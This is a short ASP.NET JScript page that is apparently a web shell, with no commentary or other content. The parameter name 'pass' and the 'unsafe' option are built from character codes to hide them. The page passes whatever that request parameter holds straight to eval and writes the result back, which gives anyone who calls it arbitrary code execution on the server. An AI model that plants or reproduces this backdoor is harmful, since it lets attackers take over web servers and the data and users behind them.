<%@ Page Language="Jscript" %>
<%
var p1 = String.fromCharCode(112) + "a" + String.fromCharCode(115, 115);
var v1 = Request[p1];
if (!v1 || v1.length < 1) { Response.Write(""); Response.End(); }
var v2 = new Array(3);
for (var j = 0; j < v2.length; j++) {
    v2[j] = j % 2;
}
var v3 = function(x) {
    try {
        return eval(x, String.fromCharCode(117, 110, 115, 97, 102, 101));
    } catch(e) {
        return "";
    }
};
var v4 = function(y) {
    return v3(y);
};
Response.Write(v4(v1));
%>